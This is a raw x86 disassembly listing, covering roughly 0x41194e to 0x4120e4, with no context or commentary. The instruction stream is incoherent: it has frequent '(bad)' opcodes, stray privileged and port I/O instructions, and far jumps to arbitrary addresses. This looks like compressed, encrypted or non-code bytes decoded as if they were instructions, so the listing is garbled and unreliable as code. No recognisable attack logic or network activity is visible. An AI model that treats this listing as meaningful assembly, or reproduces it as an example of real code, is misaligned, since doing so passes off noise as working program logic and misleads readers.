  41194e:	xchg   ebp,eax
  41194f:	pop    ebx
  411950:	je     0x411911
  411952:	mov    fs,WORD PTR [eax-0x49]
  411955:	imul   esp,DWORD PTR [ecx-0x20700eb6],0xa6488d9e
  41195f:	and    eax,DWORD PTR [esi]
  411961:	cwde   
  411962:	push   esp
  411963:	jne    0x41192c
  411965:	or     bl,BYTE PTR [edx-0x3a]
  411968:	mov    ?,WORD PTR [esp+edi*8+0x4c]
  41196c:	lods   eax,DWORD PTR ds:[esi]
  41196d:	nop
  41196e:	mov    ds:0x25e19838,al
  411973:	add    BYTE PTR [edx+0x2275f438],dh
  411979:	jl     0x41190e
  41197b:	(bad)  
  41197c:	pop    ss
  41197d:	mov    al,0xeb
  41197f:	inc    ebp
  411980:	cld    
  411981:	xchg   edi,eax
  411982:	jecxz  0x41197c
  411984:	sti    
  411985:	and    BYTE PTR [ebx+0x6b],ch
  411988:	fild   QWORD PTR [eax+ebp*8-0x7e57c51c]
  41198f:	or     DWORD PTR [ecx+0x7a],ebx
  411992:	call   0xcc8c:0x4f4fdb99
  411999:	fld    DWORD PTR [edx]
  41199b:	dec    ebp
  41199c:	push   edx
  41199d:	dec    eax
  41199e:	sub    BYTE PTR [ecx],bh
  4119a0:	div    BYTE PTR [esi-0x29095c3b]
  4119a6:	push   0x58cc32d
  4119ab:	mov    bh,0x79
  4119ad:	xor    ah,bh
  4119af:	xor    al,0x91
  4119b1:	or     al,0x54
  4119b3:	push   esp
  4119b4:	aad    0xe1
  4119b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119b7:	out    dx,al
  4119b8:	cli    
  4119b9:	xchg   esi,eax
  4119ba:	sub    bh,BYTE PTR [eax]
  4119bc:	push   ebp
  4119bd:	add    eax,0x4435ff85
  4119c2:	xchg   ebx,eax
  4119c3:	mov    dh,0x9f
  4119c5:	sub    eax,0xa46771d8
  4119ca:	retf   0x2377
  4119cd:	adc    BYTE PTR [esi],bl
  4119cf:	jns    0x41199f
  4119d1:	scas   eax,DWORD PTR es:[edi]
  4119d2:	aas    
  4119d3:	jp     0x4119a8
  4119d5:	inc    edx
  4119d6:	pop    edi
  4119d7:	ret    0x53d7
  4119da:	xchg   ebp,eax
  4119db:	lods   eax,DWORD PTR ds:[esi]
  4119dc:	je     0x4119ba
  4119de:	mov    eax,ds:0x2bdcbe60
  4119e3:	sub    dl,BYTE PTR ds:0x9203a4e8
  4119e9:	fcom   QWORD PTR [ebx]
  4119eb:	sub    ebp,DWORD PTR [edx]
  4119ed:	jbe    0x4119fb
  4119ef:	and    BYTE PTR [edi-0x90c5de5],0x43
  4119f6:	mov    edx,0x83ccaa26
  4119fb:	and    ebx,DWORD PTR [ecx+0x3cd8841f]
  411a01:	(bad)  
  411a02:	jl     0x4119d8
  411a04:	loop   0x4119a3
  411a06:	cmp    DWORD PTR [ecx-0x6e],esi
  411a09:	scas   al,BYTE PTR es:[edi]
  411a0a:	data16 int 0xdf
  411a0d:	mov    ss,WORD PTR [ebx]
  411a0f:	pop    edi
  411a10:	jmp    FWORD PTR [ecx+0x16]
  411a13:	jae    0x411a2f
  411a15:	(bad)  
  411a16:	shr    BYTE PTR [ebp+0x4f1e92a1],0x63
  411a1d:	lods   al,BYTE PTR ds:[esi]
  411a1e:	das    
  411a1f:	push   eax
  411a20:	hlt    
  411a21:	daa    
  411a22:	sbb    cl,0x28
  411a25:	cmp    eax,0xb077c287
  411a2a:	test   DWORD PTR [edx+0x7b],edx
  411a2d:	xchg   ebp,eax
  411a2e:	xor    ebx,edi
  411a30:	cmp    al,0x44
  411a32:	xor    bh,BYTE PTR [ebx]
  411a34:	mov    ch,0xce
  411a36:	push   edx
  411a37:	or     eax,eax
  411a39:	les    ebx,FWORD PTR [ebx-0x5b35e9eb]
  411a3f:	outs   dx,DWORD PTR ds:[esi]
  411a40:	rcr    DWORD PTR [ecx],1
  411a42:	sbb    bh,BYTE PTR [ebp+0x6363c2c5]
  411a48:	dec    ebx
  411a49:	pop    es
  411a4a:	or     eax,0x5d26b0c0
  411a4f:	and    ebx,DWORD PTR [esi+0x7d]
  411a52:	push   ds
  411a53:	test   BYTE PTR [edi],dl
  411a55:	lods   al,BYTE PTR ds:[esi]
  411a56:	mov    edx,0x2569661
  411a5b:	in     eax,dx
  411a5c:	push   edx
  411a5d:	sub    BYTE PTR [ebx+0x26],0x78
  411a61:	and    bl,BYTE PTR [edx-0x386e0e47]
  411a67:	mov    esp,ecx
  411a69:	lock xor esi,esi
  411a6c:	xchg   edi,eax
  411a6d:	fstp   DWORD PTR [ebx+0x64075d3]
  411a73:	std    
  411a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a75:	or     ecx,esi
  411a77:	fnstsw WORD PTR [ecx+ebp*2+0x2d]
  411a7b:	std    
  411a7c:	js     0x411a79
  411a7e:	out    dx,al
  411a7f:	mov    ecx,?
  411a81:	fisttp WORD PTR [ebx]
  411a83:	sub    esi,DWORD PTR [esi]
  411a85:	and    cl,cl
  411a87:	cmp    esp,DWORD PTR [ecx-0x14]
  411a8a:	test   DWORD PTR [edi-0x7c],ebx
  411a8d:	cmc    
  411a8e:	es mov ebp,0x2fe2ca2a
  411a94:	jb     0x411b0a
  411a96:	out    dx,eax
  411a97:	pop    ss
  411a98:	cdq    
  411a99:	fs mov edi,0x4ca95327
  411a9f:	dec    ecx
  411aa0:	cld    
  411aa1:	xor    dl,0x2f
  411aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa5:	fsub   QWORD PTR [ecx+0x7d]
  411aa8:	ins    BYTE PTR es:[edi],dx
  411aa9:	sub    DWORD PTR [esi],ebx
  411aab:	repz push edi
  411aad:	add    ebx,DWORD PTR [edx]
  411aaf:	mov    eax,0x100f2040
  411ab4:	jno    0x411b13
  411ab6:	mov    al,0x90
  411ab8:	(bad)  
  411ab9:	pop    eax
  411aba:	call   0xdb89:0xc60c35a9
  411ac1:	push   ebp
  411ac2:	mov    edi,0x9eb72cc9
  411ac7:	out    dx,eax
  411ac8:	retf   0x37eb
  411acb:	imul   DWORD PTR [esi+0x4f520593]
  411ad1:	clc    
  411ad2:	icebp  
  411ad3:	xchg   BYTE PTR [ebx-0x43],dl
  411ad6:	push   ds
  411ad7:	jle    0x411a5f
  411ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ada:	arpl   WORD PTR [esi+0x7a5daf66],sp
  411ae0:	(bad)  
  411ae1:	sbb    DWORD PTR [ecx-0x15],esp
  411ae4:	cmp    eax,0xda9a443c
  411ae9:	(bad)  
  411aea:	jnp    0x411a77
  411aec:	mov    WORD PTR [ebp+0x15],gs
  411aef:	lods   al,BYTE PTR ds:[esi]
  411af0:	pop    edx
  411af1:	fsubr  DWORD PTR [ecx-0x34]
  411af4:	outs   dx,BYTE PTR ds:[esi]
  411af5:	add    al,0x3d
  411af7:	inc    ebp
  411af8:	mov    eax,ds:0xdf657af3
  411afd:	push   ebp
  411afe:	and    BYTE PTR [edx+0x10],al
  411b01:	sub    al,0x4f
  411b03:	sbb    edx,DWORD PTR [esi-0x261b7e3f]
  411b09:	sar    edx,cl
  411b0b:	call   0x7222:0x31d3d6ff
  411b12:	push   es
  411b13:	retf   
  411b14:	adc    DWORD PTR [ebx],eax
  411b16:	mov    ecx,0x956d80d
  411b1b:	stc    
  411b1c:	xor    eax,0xcf7e6d68
  411b21:	push   edi
  411b22:	or     ah,BYTE PTR [esp+eiz*2]
  411b25:	push   ebp
  411b26:	pop    ecx
  411b27:	add    bl,BYTE PTR [edx+ecx*1+0x68]
  411b2b:	push   edx
  411b2c:	mov    dl,0x4d
  411b2e:	dec    eax
  411b2f:	dec    edi
  411b30:	mov    edx,0xf582f156
  411b35:	xchg   ebp,eax
  411b36:	add    al,0xae
  411b38:	xor    esp,ebp
  411b3a:	sbb    DWORD PTR [ebx],edi
  411b3c:	or     DWORD PTR [bx+0x4c],ecx
  411b40:	jle    0x411baa
  411b42:	mov    ds:0xf600e320,al
  411b47:	outs   dx,DWORD PTR ds:[esi]
  411b48:	jg     0x411b7e
  411b4a:	push   ebp
  411b4b:	repnz mov al,ds:0x23cc3058
  411b51:	or     esi,DWORD PTR [ebp+0x3e]
  411b54:	mov    ebx,0x78d3d512
  411b59:	bound  esi,QWORD PTR [esi+0x7e6689e2]
  411b5f:	cmp    DWORD PTR [edx-0x44],ebp
  411b62:	daa    
  411b63:	add    DWORD PTR [ebp+ebp*2+0x24],esi
  411b67:	add    al,0xe0
  411b69:	(bad)  
  411b6b:	mov    al,0xd9
  411b6d:	and    ch,cl
  411b6f:	mov    ss,WORD PTR [edi+0x16]
  411b72:	and    DWORD PTR [ebx+0x55],eax
  411b75:	mov    ah,0xbc
  411b77:	cwde   
  411b78:	loop   0x411b4f
  411b7a:	je     0x411b4c
  411b7c:	push   ss
  411b7d:	jge    0x411b4a
  411b7f:	fcomp  QWORD PTR [edi-0x48]
  411b82:	pusha  
  411b83:	add    DWORD PTR [edx],edi
  411b85:	lock hlt 
  411b87:	push   es
  411b88:	jmp    0xb71b:0x7e1b32d5
  411b8f:	rcl    DWORD PTR [ebx-0xd6f8eb1],0xcd
  411b96:	mov    esp,0xacb41cf1
  411b9b:	retf   
  411b9c:	cmp    eax,0xff4a639
  411ba1:	ret    
  411ba2:	(bad)  
  411ba3:	cs (bad) 
  411ba5:	jl     0x411bd5
  411ba7:	in     eax,dx
  411ba8:	pop    ds
  411ba9:	ds xchg edx,eax
  411bab:	iret   
  411bac:	hlt    
  411bad:	out    dx,al
  411bae:	(bad)  
  411baf:	in     al,0xd8
  411bb1:	ja     0x411b81
  411bb3:	push   edi
  411bb4:	push   cs
  411bb5:	fild   QWORD PTR [ebx-0x3ec5c586]
  411bbb:	pop    esp
  411bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bbd:	loopne 0x411c23
  411bbf:	fcmovb st,st(7)
  411bc1:	mov    cl,0x29
  411bc3:	mov    dh,0x61
  411bc5:	fiadd  WORD PTR ds:0x500e2a31
  411bcb:	shl    bh,0xa2
  411bce:	fcomp  QWORD PTR [esi]
  411bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bd1:	repnz mov bh,BYTE PTR [edi+esi*8-0x55f65115]
  411bd9:	lods   eax,DWORD PTR ds:[esi]
  411bda:	push   es
  411bdb:	in     eax,dx
  411bdc:	jno    0x411b78
  411bde:	inc    esi
  411bdf:	mov    ds:0x60fc365a,al
  411be4:	into   
  411be5:	push   esp
  411be6:	push   0xffffffef
  411be8:	adc    al,0xe2
  411bea:	xor    al,0x66
  411bec:	and    BYTE PTR [eiz*8+0x28f057af],ch
  411bf3:	add    BYTE PTR [edx-0x51],dh
  411bf6:	inc    esp
  411bf7:	or     cl,BYTE PTR [esi+edi*8+0x67]
  411bfb:	push   0x214a671
  411c00:	iret   
  411c01:	sub    eax,0xc8a832e4
  411c06:	sbb    BYTE PTR [ebx+0x71],bl
  411c09:	pusha  
  411c0a:	(bad)  
  411c0b:	push   edi
  411c0c:	mov    al,ds:0x24954554
  411c11:	mov    al,0x11
  411c13:	xchg   esp,eax
  411c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c15:	add    bh,BYTE PTR [ebx]
  411c17:	and    ecx,DWORD PTR [ebx+0x3a]
  411c1a:	out    dx,al
  411c1b:	xchg   ecx,eax
  411c1c:	in     al,dx
  411c1d:	sub    DWORD PTR [ebx],ebp
  411c1f:	cmp    BYTE PTR [edi+0x4a650efb],ch
  411c25:	aaa    
  411c26:	repz add BYTE PTR [esi],0xa9
  411c2a:	cmc    
  411c2b:	cdq    
  411c2c:	mov    bh,0x18
  411c2e:	jae    0x411c7d
  411c30:	jbe    0x411c2b
  411c32:	call   0xa3c7eb9a
  411c37:	mov    esp,0x9bf936ca
  411c3c:	js     0x411bd5
  411c3e:	push   eax
  411c3f:	aaa    
  411c40:	xchg   ecx,eax
  411c41:	mov    dh,bh
  411c43:	add    al,0x10
  411c45:	loopne 0x411c45
  411c47:	stc    
  411c48:	rcl    BYTE PTR [ebp-0x2f],0xfa
  411c4c:	imul   esi,DWORD PTR [ecx+0x1d90e159],0x71
  411c53:	pop    ebp
  411c54:	pop    ebx
  411c55:	jo     0x411bde
  411c57:	inc    edx
  411c58:	pop    ss
  411c59:	fisubr DWORD PTR cs:[eax+0x3ba26fea]
  411c60:	popa   
  411c61:	fisub  DWORD PTR ds:[eax+ebp*2-0x90bb9bb]
  411c69:	jl     0x411c7f
  411c6b:	dec    ebp
  411c6c:	add    eax,0xddc743a4
  411c71:	mov    eax,0xe539cc55
  411c76:	aaa    
  411c77:	xchg   esp,eax
  411c78:	xor    al,0xc
  411c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c7b:	retf   0x175b
  411c7e:	test   DWORD PTR [ebp+0x56],edx
  411c81:	xor    ecx,edx
  411c83:	out    dx,al
  411c84:	jmp    0x411ce2
  411c86:	cmp    DWORD PTR [edx],0x4141cd04
  411c8c:	xchg   esp,eax
  411c8d:	lods   al,BYTE PTR ds:[esi]
  411c8e:	rol    BYTE PTR [edx+0x21],cl
  411c91:	stos   DWORD PTR es:[edi],eax
  411c92:	mov    ah,0xf1
  411c94:	add    DWORD PTR [ebx],ebp
  411c96:	ins    BYTE PTR es:[edi],dx
  411c97:	adc    bl,BYTE PTR [ecx+ebp*2-0x71b7df6e]
  411c9e:	dec    esp
  411c9f:	(bad)  
  411ca0:	cmp    edx,ecx
  411ca2:	adc    BYTE PTR [ebx-0x4dcfffb],cl
  411ca8:	cmp    eax,0xc496675f
  411cad:	not    BYTE PTR [ebx]
  411caf:	inc    dh
  411cb1:	or     dl,BYTE PTR [ebp-0x2b]
  411cb4:	sub    ecx,DWORD PTR [ecx-0x1f]
  411cb7:	jmp    0xb66050a3
  411cbc:	call   0xe779:0x17e301d1
  411cc3:	adc    DWORD PTR [edi-0xb],0x8bb881f5
  411cca:	add    esp,DWORD PTR [edx]
  411ccc:	cmp    al,0x8f
  411cce:	cli    
  411ccf:	rcl    DWORD PTR [eax+0x5b398dc4],1
  411cd5:	mov    edx,0xa138eea8
  411cda:	js     0x411cb0
  411cdc:	cmc    
  411cdd:	daa    
  411cde:	sti    
  411cdf:	push   eax
  411ce0:	clc    
  411ce1:	or     DWORD PTR [ecx-0x7b],esp
  411ce4:	ss ins BYTE PTR es:[edi],dx
  411ce6:	mov    ah,0x70
  411ce8:	lds    ecx,FWORD PTR [esi]
  411cea:	jge    0x411c97
  411cec:	add    al,0x7d
  411cee:	add    al,0x72
  411cf0:	fwait
  411cf1:	shl    cl,cl
  411cf3:	shr    DWORD PTR [eax+0x7534dd1d],1
  411cf9:	sub    ah,0xe7
  411cfc:	into   
  411cfd:	fild   WORD PTR [ebp+0x6b94772f]
  411d03:	jle    0x411d69
  411d05:	jp     0x411d57
  411d07:	das    
  411d08:	xchg   esi,eax
  411d09:	aaa    
  411d0a:	fdiv   QWORD PTR [edi+0xd]
  411d0d:	repnz cmc 
  411d0f:	jb     0x411d13
  411d11:	mov    bl,0xaf
  411d13:	inc    ebp
  411d14:	pushf  
  411d15:	clc    
  411d16:	std    
  411d17:	or     ecx,eax
  411d19:	aas    
  411d1a:	nop
  411d1b:	ins    BYTE PTR es:[edi],dx
  411d1c:	lods   al,BYTE PTR ds:[esi]
  411d1d:	lods   al,BYTE PTR ds:[esi]
  411d1e:	pushf  
  411d1f:	aas    
  411d20:	mov    ah,0xe
  411d22:	daa    
  411d23:	inc    ebx
  411d24:	call   0x8c61e9d9
  411d29:	test   eax,0x98fadd7e
  411d2e:	mov    ds:0xc2eba042,eax
  411d33:	push   ds
  411d34:	jo     0x411d4c
  411d36:	mov    ebx,0x289b6b17
  411d3b:	lahf   
  411d3c:	or     BYTE PTR [ebp-0x34],ah
  411d3f:	and    esp,DWORD PTR [ebp+0x1c]
  411d42:	xchg   ebp,eax
  411d43:	lea    edx,fs:[ebx+0x5d]
  411d47:	aam    0x34
  411d49:	inc    ecx
  411d4a:	dec    edx
  411d4b:	test   DWORD PTR [eax],edx
  411d4d:	mov    al,BYTE PTR [edi+0x77]
  411d50:	(bad)  
  411d51:	dec    DWORD PTR [esi-0x6cd807eb]
  411d57:	test   BYTE PTR [edi+0xcbb4f37],bh
  411d5d:	sbb    ebx,DWORD PTR [ebx+0x5af68720]
  411d63:	and    DWORD PTR [ecx+0x6c3c7d19],ecx
  411d69:	(bad)  
  411d6a:	xchg   esi,eax
  411d6b:	dec    ebx
  411d6c:	push   eax
  411d6d:	pushf  
  411d6e:	cmp    al,0xf8
  411d70:	cdq    
  411d71:	imul   esi,esp,0xdcfd1074
  411d77:	pop    es
  411d78:	daa    
  411d79:	push   0xffffffa6
  411d7b:	xor    DWORD PTR [esi+0x73],ebp
  411d7e:	cli    
  411d7f:	add    bh,BYTE PTR [edi+0x183d4fd]
  411d85:	cmp    edi,DWORD PTR [ebx+0x7e3b4c7e]
  411d8b:	mov    ah,0x24
  411d8d:	scas   al,BYTE PTR es:[edi]
  411d8e:	xchg   ebx,eax
  411d8f:	push   ss
  411d90:	lods   eax,DWORD PTR ds:[esi]
  411d91:	(bad)  
  411d92:	and    al,0x40
  411d94:	sub    cl,dh
  411d96:	les    esp,FWORD PTR [eax]
  411d98:	add    ecx,ebp
  411d9a:	jl     0x411dc5
  411d9c:	xchg   edi,eax
  411d9d:	and    eax,0x33f81ce1
  411da2:	push   cs
  411da3:	sti    
  411da4:	hlt    
  411da5:	nop
  411da6:	xchg   ebp,eax
  411da7:	fisttp DWORD PTR [ebp-0x922e53a]
  411dad:	imul   ebx
  411daf:	push   esp
  411db0:	and    esp,edx
  411db2:	adc    BYTE PTR [edi+0x48],dl
  411db5:	stc    
  411db6:	neg    ch
  411db8:	mov    ah,0xb2
  411dba:	popf   
  411dbb:	push   ebx
  411dbc:	add    ah,BYTE PTR [ecx+0x6d3f3ba9]
  411dc2:	dec    ebx
  411dc3:	mov    ebx,0x2b3c2487
  411dc8:	mov    al,ds:0x1998e627
  411dcd:	nop
  411dce:	sbb    eax,0x7d0ebfd9
  411dd3:	adc    al,0xcf
  411dd5:	rol    BYTE PTR [eax+0x3cd30bfd],cl
  411ddb:	(bad)  
  411ddc:	cdq    
  411ddd:	clc    
  411dde:	aas    
  411ddf:	jb     0x411d6c
  411de1:	dec    edi
  411de2:	(bad)  
  411de4:	out    0xca,eax
  411de6:	fild   QWORD PTR [eax]
  411de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de9:	fbld   TBYTE PTR [eax]
  411deb:	and    BYTE PTR [esi+0x252e9d73],bl
  411df1:	ret    
  411df2:	push   edi
  411df3:	mov    al,ds:0xf88f10ee
  411df8:	xchg   ecx,eax
  411df9:	loopne 0x411e62
  411dfb:	daa    
  411dfc:	push   esp
  411dfd:	hlt    
  411dfe:	jbe    0x411da1
  411e00:	(bad)  
  411e02:	jne    0x411d8b
  411e04:	mov    bl,0xd2
  411e06:	mov    esp,0x89fb47e4
  411e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e0c:	add    BYTE PTR [ecx+ebx*2],ah
  411e0f:	dec    ecx
  411e10:	(bad)  
  411e12:	retf   
  411e13:	or     edx,eax
  411e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e16:	(bad)  
  411e17:	call   FWORD PTR [ecx]
  411e19:	inc    edx
  411e1a:	aas    
  411e1b:	inc    esp
  411e1c:	jmp    0xacc01238
  411e21:	shl    DWORD PTR [eax-0x76],0xd
  411e25:	pop    ecx
  411e26:	out    dx,al
  411e27:	cs sbb al,0x5a
  411e2a:	mov    ebp,DWORD PTR [eax]
  411e2c:	imul   esp,ebx,0xcdba291c
  411e32:	mov    bh,0xa1
  411e35:	fwait
  411e36:	inc    ebp
  411e37:	push   ecx
  411e38:	xor    al,0xae
  411e3a:	lods   al,BYTE PTR ds:[esi]
  411e3b:	jle    0x411e97
  411e3d:	push   ebp
  411e3e:	mov    esi,0x8bfd3053
  411e43:	mov    dh,0xb
  411e45:	jb     0x411e9a
  411e47:	add    ebx,DWORD PTR cs:0x728ed88
  411e4e:	lahf   
  411e4f:	cmc    
  411e50:	ds shl ch,1
  411e53:	das    
  411e54:	test   dl,bl
  411e56:	dec    edi
  411e57:	dec    edx
  411e58:	and    al,BYTE PTR [ebx-0x408f88fa]
  411e5e:	mov    al,0x30
  411e60:	add    al,0x46
  411e62:	push   ds
  411e63:	in     al,dx
  411e64:	nop
  411e65:	sahf   
  411e66:	xor    esi,DWORD PTR [esi]
  411e68:	jg     0x411e9e
  411e6a:	mov    ah,0xbb
  411e6c:	pop    ss
  411e6d:	out    0x6b,eax
  411e6f:	push   cs
  411e70:	xchg   DWORD PTR [edx],edx
  411e72:	inc    ebp
  411e73:	jne    0x411e36
  411e75:	push   0x18
  411e77:	test   BYTE PTR [edx+edi*1+0x69a4cef8],ch
  411e7e:	std    
  411e7f:	xor    DWORD PTR [edx+0x47],ecx
  411e82:	nop
  411e83:	rol    esp,cl
  411e85:	push   es
  411e86:	repz pop ebx
  411e88:	sub    al,0x83
  411e8a:	sub    DWORD PTR [edi],esi
  411e8c:	jnp    0x411e76
  411e8e:	or     ebx,edx
  411e90:	xlat   BYTE PTR ds:[ebx]
  411e91:	and    DWORD PTR [eax+0xe20c213],0x35
  411e98:	js     0x411e6e
  411e9a:	add    al,0x7b
  411e9c:	or     eax,DWORD PTR [ecx+edi*2]
  411e9f:	jae    0x411e55
  411ea1:	jnp    0x411e4d
  411ea3:	gs aas 
  411ea5:	loopne 0x411e90
  411ea7:	jne    0x411eb5
  411ea9:	add    DWORD PTR [eax],0xf55bc70d
  411eaf:	sbb    DWORD PTR [esi-0x7d0edbcc],ebp
  411eb5:	add    al,0x40
  411eb7:	ds iret 
  411eb9:	mov    edx,0x3a950b73
  411ebe:	push   0x4f91a3b1
  411ec3:	aaa    
  411ec4:	fnsave [ebx]
  411ec6:	sub    ch,BYTE PTR [esi+ebx*8-0x7f]
  411eca:	or     dl,cl
  411ecc:	mov    bl,BYTE PTR [edi+0x1add30a3]
  411ed2:	sub    BYTE PTR [eax-0x2a],ch
  411ed5:	pop    ebp
  411ed6:	xor    edi,DWORD PTR [ecx]
  411ed8:	jmp    0x5f1b:0x6f6f4f76
  411edf:	loop   0x411e6e
  411ee1:	adc    eax,0xc0a9a84c
  411ee6:	ret    0x9206
  411ee9:	mov    ds:0xf0224f3d,eax
  411eee:	shl    BYTE PTR [ecx-0x63c96baf],cl
  411ef4:	inc    esi
  411ef5:	push   ds
  411ef6:	and    DWORD PTR es:[esi-0x2e],esi
  411efa:	sub    BYTE PTR [edx+0x76],bh
  411efd:	cmp    al,0x7b
  411eff:	ins    DWORD PTR es:[edi],dx
  411f00:	jnp    0x411f0e
  411f02:	xor    BYTE PTR [eax],0x64
  411f05:	adc    BYTE PTR [eax+eax*2+0x4],dh
  411f09:	es dec esi
  411f0b:	lock cld 
  411f0d:	ja     0x411ed8
  411f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f10:	lea    edi,[ebp-0x666a6612]
  411f16:	mov    esi,0xab415870
  411f1b:	add    ah,BYTE PTR [esi+ebx*8-0x29627186]
  411f22:	ss scas eax,DWORD PTR es:[edi]
  411f24:	push   esp
  411f25:	rcr    BYTE PTR [eax-0x31],1
  411f28:	(bad)  
  411f29:	(bad)  
  411f2a:	test   al,0xe0
  411f2c:	mov    esi,0x5d1edbc6
  411f31:	fist   WORD PTR [eiz*2+0x11ab0113]
  411f38:	pushf  
  411f39:	adc    eax,0xd73921a8
  411f3e:	bound  esi,QWORD PTR [ecx-0x74779dbe]
  411f44:	mov    bl,al
  411f46:	dec    edx
  411f47:	dec    edi
  411f48:	dec    esi
  411f49:	mov    DWORD PTR [edi-0x7],ebp
  411f4c:	or     ecx,DWORD PTR [ecx]
  411f4e:	xor    dl,al
  411f50:	ins    BYTE PTR es:[edi],dx
  411f51:	and    edi,DWORD PTR [ebx+0x26]
  411f54:	les    edx,FWORD PTR [esi]
  411f56:	cmp    ebx,ebp
  411f58:	test   DWORD PTR [esi+0x3f],esi
  411f5b:	cs test al,0x58
  411f5e:	and    BYTE PTR [edx+0x4a],dh
  411f61:	cmp    dl,cl
  411f63:	je     0x411f52
  411f65:	lock (bad) 
  411f67:	ins    DWORD PTR es:[edi],dx
  411f68:	fst    QWORD PTR [eax+0x65]
  411f6b:	jmp    DWORD PTR [edx+0x1c6c6e0f]
  411f71:	or     cl,bh
  411f73:	int    0xec
  411f75:	cdq    
  411f76:	jne    0x411f76
  411f78:	adc    ebx,ebp
  411f7a:	std    
  411f7b:	dec    BYTE PTR [eax-0x10]
  411f7e:	jae    0x411f88
  411f80:	popa   
  411f81:	lahf   
  411f82:	in     al,0xd
  411f84:	es mov dh,0xfa
  411f87:	scas   al,BYTE PTR es:[edi]
  411f88:	and    DWORD PTR ds:0xe3204530,ebx
  411f8e:	fnsave [esi]
  411f90:	daa    
  411f91:	lock mov ds:0xc1f61f15,eax
  411f97:	xor    BYTE PTR [edx],ch
  411f99:	mov    eax,0x59629a7c
  411f9e:	and    BYTE PTR [ecx-0x16f32373],0x9b
  411fa5:	sbb    esi,DWORD PTR ds:0x9e556052
  411fab:	push   edx
  411fac:	addr16 pop ebp
  411fae:	and    cl,BYTE PTR [ecx+0x1c04221c]
  411fb4:	push   ebp
  411fb5:	jb     0x41200d
  411fb7:	data16 fs sti 
  411fba:	adc    edi,DWORD PTR ds:0x738052de
  411fc0:	or     eax,0xeecef0b6
  411fc5:	cwde   
  411fc6:	jge    0x41201a
  411fc8:	or     al,0x81
  411fca:	or     BYTE PTR [ebx],bh
  411fcc:	(bad)  
  411fcd:	xor    esi,DWORD PTR [ecx]
  411fcf:	push   ds
  411fd0:	xchg   BYTE PTR [ebx-0x21b46590],bl
  411fd6:	xlat   BYTE PTR ds:[ebx]
  411fd7:	test   DWORD PTR [edi+0x77ce77d0],ebx
  411fdd:	or     BYTE PTR [edx-0x2ccc346b],ch
  411fe3:	mov    al,0x9
  411fe5:	push   0x6f
  411fe7:	sti    
  411fe8:	aad    0x35
  411fea:	cld    
  411feb:	cmp    eax,DWORD PTR [edx]
  411fed:	adc    DWORD PTR [eax-0xd],edi
  411ff0:	mov    dh,0x9d
  411ff2:	xchg   edi,eax
  411ff3:	ins    DWORD PTR es:[edi],dx
  411ff4:	mov    eax,ds:0x3298537f
  411ff9:	mov    ebx,0x58bdd101
  411ffe:	xor    dl,BYTE PTR [edx+0x653c585c]
  412004:	mov    ch,0xb7
  412006:	mov    edx,0x79b9a605
  41200b:	or     DWORD PTR [ebp-0x6e],ebp
  41200e:	inc    ebx
  41200f:	xor    eax,0x198bfb01
  412014:	adc    cl,ch
  412016:	adc    DWORD PTR [ebx],edx
  412018:	sbb    ah,ah
  41201a:	push   ebx
  41201b:	sbb    DWORD PTR [edi+0x7863227f],esp
  412021:	out    0x70,al
  412023:	jmp    0xeec983e9
  412028:	cli    
  412029:	gs leave 
  41202b:	xchg   esi,eax
  41202c:	scas   eax,DWORD PTR es:[edi]
  41202d:	dec    edi
  41202e:	xor    ebp,DWORD PTR ds:0xb0a24174
  412034:	rol    DWORD PTR [bx+0x1c],0x6d
  412039:	dec    esp
  41203a:	and    esp,DWORD PTR [edi-0x3cd4d03f]
  412040:	mov    bl,0x6b
  412042:	add    bl,BYTE PTR [edi]
  412044:	cmp    al,0xd1
  412046:	nop
  412047:	or     bl,bl
  412049:	xchg   DWORD PTR [ebp+0x7a],ecx
  41204c:	cld    
  41204d:	test   BYTE PTR [ecx],ah
  41204f:	mov    ch,0x3e
  412051:	mov    ah,0x6d
  412053:	dec    eax
  412054:	push   es
  412055:	mov    ch,0x3e
  412057:	loopne 0x412058
  412059:	xchg   edi,eax
  41205a:	retf   
  41205b:	shl    DWORD PTR ds:0x3913eb44,1
  412061:	popf   
  412062:	inc    esi
  412063:	add    BYTE PTR [ebp-0x6cc5f1f2],ah
  412069:	loopne 0x41203e
  41206b:	iret   
  41206c:	and    al,0x4d
  41206e:	loop   0x412046
  412070:	je     0x41204c
  412072:	lock cli 
  412074:	std    
  412075:	adc    eax,0x2aba952a
  41207a:	cmc    
  41207b:	shl    DWORD PTR [eax],cl
  41207d:	mov    bl,0x23
  41207f:	fcmovnbe st,st(2)
  412081:	pop    es
  412082:	push   ebp
  412083:	test   DWORD PTR [eax],esi
  412085:	add    BYTE PTR [esi+0x6e04c19d],al
  41208b:	or     al,0x6a
  41208d:	dec    ebx
  41208e:	pop    eax
  41208f:	ret    
  412090:	mov    esi,0xe1d3bbbc
  412095:	fild   WORD PTR [ecx+0x1b7d237a]
  41209b:	pop    ss
  41209c:	in     eax,dx
  41209d:	test   DWORD PTR [esi-0xe7c4ccc],0xcb0c47de
  4120a7:	test   BYTE PTR [ebx-0x60f6fc7c],cl
  4120ad:	jne    0x4120c6
  4120af:	fwait
  4120b0:	pop    edx
  4120b1:	inc    ebp
  4120b2:	add    bl,BYTE PTR [eax+0x60]
  4120b5:	in     eax,dx
  4120b6:	jge    0x4120b6
  4120b8:	sar    DWORD PTR [esp+ecx*2+0x42e32a9c],cl
  4120bf:	xor    eax,0xd589e7aa
  4120c4:	scas   eax,DWORD PTR es:[edi]
  4120c5:	jp     0x4120d5
  4120c7:	or     BYTE PTR [eax+0x774f8455],al
  4120cd:	push   ss
  4120ce:	sbb    dl,dl
  4120d0:	stc    
  4120d1:	adc    DWORD PTR ds:0x66e830aa,edi
  4120d7:	add    BYTE PTR [ebp-0x59c96071],ah
  4120dd:	scas   eax,DWORD PTR es:[edi]
  4120de:	mov    esi,0x8d404de9
  4120e3:	pop    ebx
  4120e4:	(bad)  
